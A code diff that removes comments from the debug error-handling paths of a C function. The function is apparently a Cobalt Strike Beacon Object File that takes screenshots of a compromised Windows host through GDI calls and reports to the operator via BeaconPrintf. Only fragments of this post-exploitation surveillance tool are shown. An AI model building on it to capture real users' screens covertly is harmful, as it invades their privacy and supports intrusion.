@@ -730,13 +730,13 @@ void go(char* buff, int len)
         HDC hScreen = pGetDC(NULL);
         if (hScreen == NULL) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pGetDC(NULL) returned NULL. Last error: %lu", GetLastError());
-            return;  // Depending on your flow, consider exiting or additional error handling
+            return; 
         }
         
         HDC hDC = pCreateCompatibleDC(hScreen);
         if (hDC == NULL) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] pCreateCompatibleDC failed. Last error: %lu", GetLastError());
-            pReleaseDC(NULL, hScreen);  // Clean up the obtained screen DC before returning
+            pReleaseDC(NULL, hScreen); 
             return;
         }
         hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
@@ -753,7 +753,7 @@ void go(char* buff, int len)
                          "[DEBUG] BitBlt failed for full screen capture. Error code: %lu",
                          errorCode);
         
-            // Print general information about handles and region.
+
             BeaconPrintf(CALLBACK_ERROR,
                          "[DEBUG] hDC: %p, hScreen: %p, old_obj: %p",
                          hDC, hScreen, old_obj);
@@ -761,8 +761,7 @@ void go(char* buff, int len)
                          "[DEBUG] Screen region: x1: %d, y1: %d, width: %d, height: %d",
                          x1, y1, w, h);
         
-            // Additional checks to determine which handle might be invalid.
-            // Check hScreen
+
             if (hScreen == NULL) {
                 BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen is NULL (handle invalid)");
             } else {
